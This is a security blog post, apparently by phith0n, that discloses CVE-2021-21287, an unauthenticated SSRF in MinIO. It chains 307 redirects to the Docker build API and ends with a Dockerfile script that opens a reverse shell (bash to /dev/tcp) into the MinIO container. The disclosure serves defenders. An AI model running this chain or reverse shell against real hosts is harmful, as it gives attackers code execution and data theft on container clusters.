

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>CVE-2021-21287: Pentesting a MinIO on the Cloud | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                网络安全 &raquo; <a href="the-collision-of-containers-and-the-cloud-pentesting-a-MinIO-EN.html">CVE-2021-21287: Pentesting a MinIO on the Cloud</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">CVE-2021-21287: Pentesting a MinIO on the Cloud</h1>
            <div class="details-up">
  <span class="author">作者: phithon</span>
  
  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
  
  <span class="date">时间: 2021-1-30 22:38</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">0条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="the-collision-of-containers-and-the-cloud-pentesting-a-MinIO-EN.html">7229人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/minio.html">minio</a>
    
        <a href="../tag/ssrf%E6%BC%8F%E6%B4%9E.html">ssrf漏洞</a>
    
  </span>
  
</div>
            <div class="entry">
                <p>本文<a href="the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html">中文版本</a>。</p>
<p>With time going by, the demand for Object Storage Service (OSS) has gradually increased. <a href="https://min.io/">MinIO</a> is an open source OSS system that supports deployment in the clouds. MinIO is fully compatible with AWS S3 protocol and also supports as a gateway to S3, so it is widely used around the world and has 25k stars on Github.</p>
<p>I used to deploy some data in MinIO and use it in CI, Dockerfile and other places. I would like to talk about a pentest story that I encountered last week.</p>
<p>On the beginning of the story, here were what I knew:</p>
<ul>
<li>There is a MinIO running in a small Docker cluster (depending on Swarm)</li>
<li>MinIO is running on its default port 9000, which is able to accessed from outside. The address is <code>http://192.168.227.131:9000</code>, but I didn't have credentials.</li>
<li><code>192.168.227.131</code>, this host is a CentOS system. The firewall is turned on. Dockerd listens to port 2375 on the internal network (in fact, this is also a swarm manager, and swarm listens on port 2377)</li>
</ul>
<p>Although there is no specific goal for this pentest, I just set myself a goal: to steal the data in MinIO or pwn it.</p>
<h2 id="0x01-code-reviews-for-minio"><a class="toclink" href="#0x01-code-reviews-for-minio">0x01 Code Reviews for MinIO</a></h2>
<p>let's learn about MinIO first. It is developed using Golang, provides an HTTP interface, and also provides a front-end page called "MinIO Browser". But you can not use it without authenticated.</p>
<p>When User-Agent matches the <code>.*Mozilla.*</code>, users can access the front-end interface of MinIO, which is a JsonRPC implemented by themselves:</p>
<p><a href="../media/attachment/2021/01/30/6896653c-ba8c-476c-a224-6b6dfce60186.png"><img alt="image-20210124211255239.png" src="../media/attachment/2021/01/30/6896653c-ba8c-476c-a224-6b6dfce60186.b343e5876f15.png" /></a></p>
<p>What make me interesting is the authenticated. I saw a method <code>webRequestAuthenticate</code> at the beginning of most RPC interfaces, which is a <a href="http://jwt.io/">JWT (JSON Web Token)</a> wrapper:</p>
<p><a href="../media/attachment/2021/01/30/7861ca8b-00bb-4393-bee8-98331154fdae.png"><img alt="image-20210124211738748.png" src="../media/attachment/2021/01/30/7861ca8b-00bb-4393-bee8-98331154fdae.c06372e6404a.png" /></a></p>
<p>Some common attack methods of JWT is:</p>
<ol>
<li>
<p>Change the <code>alg</code> to <code>None</code> to bypass the signature verification</p>
</li>
<li>
<p>If the <code>alg</code> is <code>RSA</code>, you can try to change it to <code>HS256</code>, that is, tell the server to use the public key for signature verification</p>
</li>
<li>
<p>Blasting the signature key</p>
</li>
</ol>
<p>Looking at the JWT logical of MinIO, I found that the <code>alg</code> is verified, and only the following three signature methods are allowed:</p>
<p><a href="../media/attachment/2021/01/30/580f2f79-5147-4810-b517-72dfffa6fae8.png"><img alt="image-20210124212344593.png" src="../media/attachment/2021/01/30/580f2f79-5147-4810-b517-72dfffa6fae8.0acbf2375916.png" /></a></p>
<p>So the method 1 and 2 is unused, blasting is also not a good way for this case too.</p>
<p>Continue to read the code, soon I found an interface, <code>LoginSTS</code>. This interface is actually a proxy of the AWS STS login interface, which is used to convert the request sent to JsonRPC into STS and forward it to the local 9000 port (in fact, it is itself).</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// LoginSTS - STS user login handler.</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">web</span> <span class="o">*</span><span class="nx">webAPIHandlers</span><span class="p">)</span> <span class="nx">LoginSTS</span><span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">,</span> <span class="nx">args</span> <span class="o">*</span><span class="nx">LoginSTSArgs</span><span class="p">,</span> <span class="nx">reply</span> <span class="o">*</span><span class="nx">LoginRep</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">newWebContext</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="s">&quot;WebLoginSTS&quot;</span><span class="p">)</span>

    <span class="nx">v</span> <span class="o">:=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">Values</span><span class="p">{}</span>
    <span class="nx">v</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;Action&quot;</span><span class="p">,</span> <span class="nx">webIdentity</span><span class="p">)</span>
    <span class="nx">v</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;WebIdentityToken&quot;</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">Token</span><span class="p">)</span>
    <span class="nx">v</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;Version&quot;</span><span class="p">,</span> <span class="nx">stsAPIVersion</span><span class="p">)</span>

    <span class="nx">scheme</span> <span class="o">:=</span> <span class="s">&quot;http&quot;</span>
    <span class="c1">// ...</span>

    <span class="nx">u</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">url</span><span class="p">.</span><span class="nx">URL</span><span class="p">{</span>
        <span class="nx">Scheme</span><span class="p">:</span> <span class="nx">scheme</span><span class="p">,</span>
        <span class="nx">Host</span><span class="p">:</span>   <span class="nx">r</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="nx">u</span><span class="p">.</span><span class="nx">RawQuery</span> <span class="p">=</span> <span class="nx">v</span><span class="p">.</span><span class="nx">Encode</span><span class="p">()</span>
    <span class="nx">req</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">NewRequest</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">MethodPost</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">String</span><span class="p">(),</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<p>No authentication bypass problem was found, but I found another interesting bug. In order to forward the request to "itself", MinIO obtains "own address" from the Host header sent by the user, and uses it as the Host to construct a new URL.</p>
<p>What's wrong with this function?</p>
<p>Because the request header is sent by user, any Host can be constructed here to perform an SSRF attack.</p>
<p>Let's test it. Use the CURL to send the request to <code>http://192.168.227.131:9000</code>, where the value of Host is the port opened by my local Ncat (<code>192.168.1.142:4444</code>):</p>
<div class="codehilite"><pre><span></span><code><span class="err">curl -v -i -s -k -X &#39;POST&#39; http://192.168.227.131:9000/minio/webrpc -H &#39;Host: 192.168.1.142:4444&#39; -H &#39;User-Agent: Mozilla/5.0&#39; -H &#39;Content-Type: application/json&#39; --data-binary &#39;{&quot;id&quot;:1,&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;params&quot;:{&quot;token&quot;:&quot;Test&quot;},&quot;method&quot;:&quot;web.LoginSTS&quot;}&#39;</span>
</code></pre></div>

<p>My Ncat received the request:</p>
<p><a href="../media/attachment/2021/01/30/ebe8ebd1-d1c1-4d28-92e7-8da4774e940e.png"><img alt="image-20210124215812861.png" src="../media/attachment/2021/01/30/ebe8ebd1-d1c1-4d28-92e7-8da4774e940e.6488ddc9fcc5.png" /></a></p>
<p>I confirmed that it is a unauthenticated SSRF.</p>
<h2 id="0x02-upgrade-the-ssrf"><a class="toclink" href="#0x02-upgrade-the-ssrf">0x02 Upgrade the SSRF</a></h2>
<p>This one is a POST request, but neither Path nor Body can be controlled. All I can control is a parameter <code>WebIdentityToken</code> in the URL, but this parameter is URL-encoded, any other special characters such as line breaks cannot be injected.</p>
<p>This is mean that the vulnerability can only be used to scan ports, it is not what I want.</p>
<p>Fortunately, Golang's default http library will follow 302 redirects, regardless of whether it is a GET or POST request. Therefore, I can use a 302 redirect here to "Upgrade" the SSRF vulnerability.</p>
<p>Use PHP to simply make a 302 response:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&#39;</span><span class="p">);</span>
</code></pre></div>

<p>Save and serve it to <code>index.php</code>:</p>
<p><a href="../media/attachment/2021/01/30/d699b863-4102-4479-a4e0-71d15efaf1c3.png"><img alt="image-20210124225105734.png" src="../media/attachment/2021/01/30/d699b863-4102-4479-a4e0-71d15efaf1c3.21a8369589c2.png" /></a></p>
<p>Change the Host header to this PHP server address. In this way, after a 302 redirect I got a <strong>GET</strong> request that can control the complete URL:</p>
<p><a href="../media/attachment/2021/01/30/187c113f-1d4a-4806-897d-4e3f62c25042.png"><img alt="image-20210124224837443.png" src="../media/attachment/2021/01/30/187c113f-1d4a-4806-897d-4e3f62c25042.28dcdefd4ec2.png" /></a></p>
<p>After got this restrict-less GET SSRF, combined with my previous understanding of this service, I can try to attack port 2375 of the Docker cluster.</p>
<p>2375 is the default interface of Docker API, it uses HTTP protocol to communicate. So, can I attack this interface through SSRF? I was unsure.</p>
<p>Refer to <a href="http://blog.neargle.com/SecNewsBak/drops/%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8.html">this article</a>, it is able to use <code>docker run</code> or <code>docker exec</code> to execute arbitrary commands in an unauthentication docker API. But looking through the Docker documentation, the requests for these two operations are <code>POST /containers/create</code> and <code>POST /containers/{id}/exec</code>.</p>
<p>Both APIs are POST requests, but the SSRF I have is a GET request. I still cannot use this SSRF vulnerability to attack.</p>
<h2 id="0x03-upgrade-the-ssrf-again"><a class="toclink" href="#0x03-upgrade-the-ssrf-again">0x03 Upgrade the SSRF Again</a></h2>
<p>Do you remember how I got this GET SSRF? Of course, redirects through 302 response, and the first request is a POST one, although I can't directly use this POST request because its URL is uncontrollable.</p>
<p>Then, how to craft a fully controllable POST request?</p>
<p>I thought of 307 redirect. 307 is an HTTP status code defined in <a href="https://tools.ietf.org/html/rfc7231#page-58">RFC 7231</a>, which is described as follows:</p>
<blockquote>
<p>The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent <strong>MUST NOT</strong> change the request method if it performs an automatic redirection to that URI.</p>
</blockquote>
<p>The characteristic of 307 redirect is that it will <strong>not change</strong> the original request method, that is, when the server returns the 307 status code, the client will send a request of the same method according to the address pointed to by Location header.</p>
<p>I can use this feature to get a fully controllable POST request.</p>
<p>Simply modify the previous <code>index.php</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="mi">307</span><span class="p">);</span>
</code></pre></div>

<p>SSRF attack again, my Ncat receive a POST method, URL controllable and empty body request:</p>
<p><a href="../media/attachment/2021/01/30/565c0dff-2e74-4ea0-995a-38881ae7207d.png"><img alt="image-20210124232243242.png" src="../media/attachment/2021/01/30/565c0dff-2e74-4ea0-995a-38881ae7207d.7dbb1fcf3d08.png" /></a></p>
<h2 id="0x04-attack-docker-api"><a class="toclink" href="#0x04-attack-docker-api">0x04 Attack Docker API</a></h2>
<p>Going back to the Docker API, I found that it is still impossible to use the <code>docker run</code> and <code>docker exec</code> APIs. The reason is that both APIs need to transmit JSON format parameters in the request body, and our SSRF's body is empty.</p>
<p>Going through the Docker documentation, I found another API, <a href="https://docs.docker.com/engine/api/v1.41/#operation/ImageBuild">Build an image</a>:</p>
<p><a href="../media/attachment/2021/01/30/81f686d6-4580-428a-bb4c-d2dc4f2b23d8.png"><img alt="image-20210124232945843.png" src="../media/attachment/2021/01/30/81f686d6-4580-428a-bb4c-d2dc4f2b23d8.5026e621dd2a.png" /></a></p>
<p>Most of the parameters of this API are query parameters, which I can control from URL. Read the options and find that it can accept a parameter named <code>remote</code>, the description is:</p>
<blockquote>
<p>A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file's contents are placed into a file called <code>Dockerfile</code> and the image is built from that file. If the URI points to a tarball , the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the <code>dockerfile</code> parameter is also specified, there must be a file with the corresponding path inside the tarball.</p>
</blockquote>
<p>This parameter can be passed in a Git address or an HTTP URL, whose content is a Dockerfile, a Git project containing the Dockerfile, or a compressed package containing the Dockerfile.</p>
<p>In other words, the Docker API supports building a image by specifying a remote URL without a local Dockerfile.</p>
<p>So, I tried to write such a Dockerfile to see if I can build a image. If I can, my 4444 port should be able to receive a Wget request:</p>
<div class="codehilite"><pre><span></span><code><span class="k">FROM</span> <span class="s">alpine:3.13</span>
<span class="k">RUN</span> wget -T4 http://192.168.1.142:4444/docker/build
</code></pre></div>

<p>Updated the <code>index.php</code> to point to this API:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&amp;nocache=true&amp;t=evil:1&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="mi">307</span><span class="p">);</span>
</code></pre></div>

<p>Wait for a minute, I received a expected request:</p>
<p><a href="../media/attachment/2021/01/30/db483d55-f1d5-4a3e-9d00-b53d9833d464.png"><img alt="image-20210124233853616.png" src="../media/attachment/2021/01/30/db483d55-f1d5-4a3e-9d00-b53d9833d464.da172f0b4e32.png" /></a></p>
<p>Now, I can execute arbitrary commands in a new container, no more restrict.</p>
<h2 id="0x05-attack-the-minio"><a class="toclink" href="#0x05-attack-the-minio">0x05 Attack the MinIO</a></h2>
<p>At this time, I was a little bit close to my goal, MinIO.</p>
<p>Because I can execute arbitrary commands now, I will no longer be restricted by SSRF vulnerabilities, I am able to get a reverse shell or send arbitrary request to the Docker API to control the container directly.</p>
<p>I wrote a script to automatically attack the MinIO container and put it into the Dockerfile. During the image building, a reverse shell command will be sent to the MinIO container.</p>
<div class="codehilite"><pre><span></span><code><span class="k">FROM</span> <span class="s">alpine:3.13</span>

<span class="k">RUN</span> apk add curl bash jq

<span class="k">RUN</span> <span class="nb">set</span> -ex <span class="o">&amp;&amp;</span> <span class="se">\</span>
    <span class="o">{</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;set -ex&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;target=&quot;http://192.168.227.131:2375&quot;&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;jsons=$(curl -s -XGET &quot;${target}/containers/json&quot; | jq -r &quot;.[] | @base64&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;for item in ${jsons[@]}; do&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;    name=$(echo $item | base64 -d | jq -r &quot;.Image&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;    if [[ &quot;$name&quot; == *&quot;minio/minio&quot;* ]]; then&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;        id=$(echo $item | base64 -d | jq -r &quot;.Id&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;        break&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;    fi&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;done&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;execid=$(curl -s -X POST &quot;${target}/containers/${id}/exec&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{\&quot;Cmd\&quot;: [\&quot;bash\&quot;, \&quot;-c\&quot;, \&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.142/4444 0&gt;&amp;1\&quot;]}&quot; | jq -r &quot;.Id&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;curl -s -X POST &quot;${target}/exec/${execid}/start&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{}&quot;&#39;</span><span class="p">;</span> <span class="se">\</span>
    <span class="o">}</span> <span class="p">|</span> bash
</code></pre></div>

<p>What this script does is simple. One is to traverse all the containers to find the container id, and use the exec API to execute the reverse shell command in it.</p>
<p>Finally successfully got the shell of the MinIO container:</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/WyDEn0wUhPc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></p>
<p>Of course, I can also attack cluster through the Docker API, which is beyond the scope of this article.</p>
<h2 id="0x06-summary"><a class="toclink" href="#0x06-summary">0x06 Summary</a></h2>
<p>This pentest tour started from the 9000 port of a MinIO. Through code review, a SSRF vulnerability of MinIO was discovered, and this vulnerability was used to attack the Docker API of the Intranet. Finally, the permissions of MinIO container were lost.</p>
<p>The SSRF vulnerability mentioned in this article has been fixed rapidly, here is the timeline:</p>
<ul>
<li>Jan 23, 2021, 9:11 PM - Bug reported </li>
<li>Jan 24, 2021, 3:06 AM - Bug triaged</li>
<li>Jan 26, 2021, 2:15 AM - Fix was merged into master branch</li>
<li>Jan 30, 2021, 11:22 AM - <a href="https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q">Security advisory</a> and the release is published</li>
<li>Feb 2, 2021 01:10 AM - CVE identifier assigned - CVE-2021-21287</li>
</ul>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/minio.html">minio</a>
                
                    <a href="../tag/ssrf%E6%BC%8F%E6%B4%9E.html">ssrf漏洞</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 0 条评论</h3>
            <ol class="comment-list">
            
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="5c55df7e39e9b619aafeef6a3bb01141c6430d48" />
</div><div class="col-6">
<img src="../captcha/image/5c55df7e39e9b619aafeef6a3bb01141c6430d48/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="461" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="EAYmzGPcl5j8ZarjwRjrQ6TAlegQDsKxq8md7LqVJrxRxIfHySgcNzWFGBx1c4WP">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/%E4%BA%8C%E6%89%8B%E5%95%86%E5%93%81.html">二手商品</a>
        
        <a rel="tag" href="../tag/%E7%9F%A5%E4%B9%8E.html">知乎</a>
        
        <a rel="tag" href="../tag/sqlite_bind.html">sqlite_bind</a>
        
        <a rel="tag" href="../tag/flashxss.html">flashxss</a>
        
        <a rel="tag" href="../tag/%E7%BB%87%E6%A2%A6.html">织梦</a>
        
        <a rel="tag" href="../tag/Go.html">Go</a>
        
        <a rel="tag" href="../tag/Docker.html">Docker</a>
        
        <a rel="tag" href="../tag/%E5%85%BC%E5%AE%B9%E6%80%A7.html">兼容性</a>
        
        <a rel="tag" href="../tag/Linux.html">Linux</a>
        
        <a rel="tag" href="../tag/php-fpm.html">php-fpm</a>
        
        <a rel="tag" href="../tag/goahead.html">goahead</a>
        
        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
        
        <a rel="tag" href="../tag/emlog%E6%8F%92%E4%BB%B6.html">emlog插件</a>
        
        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
        
        <a rel="tag" href="../tag/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%B5%84%E6%BA%90.html">自定义资源</a>
        
        <a rel="tag" href="../tag/joomla.html">joomla</a>
        
        <a rel="tag" href="../tag/%E6%B1%89%E5%8C%96.html">汉化</a>
        
        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
        
        <a rel="tag" href="../tag/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5.html">环境变量注入</a>
        
        <a rel="tag" href="../tag/%E5%A4%9A%E7%BA%BF%E7%A8%8B.html">多线程</a>
        
        <a rel="tag" href="../tag/%E4%B8%8A%E7%BD%91.html">上网</a>
        
        <a rel="tag" href="../tag/wopus.html">wopus</a>
        
        <a rel="tag" href="../tag/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2.html">进制转换</a>
        
        <a rel="tag" href="../tag/audit.html">audit</a>
        
        <a rel="tag" href="../tag/htaccess.html">htaccess</a>
        
        <a rel="tag" href="../tag/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE.html">开源项目</a>
        
        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
        
        <a rel="tag" href="../tag/yxcms.html">yxcms</a>
        
        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
        
        <a rel="tag" href="../tag/tea.html">tea</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">热门日志</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
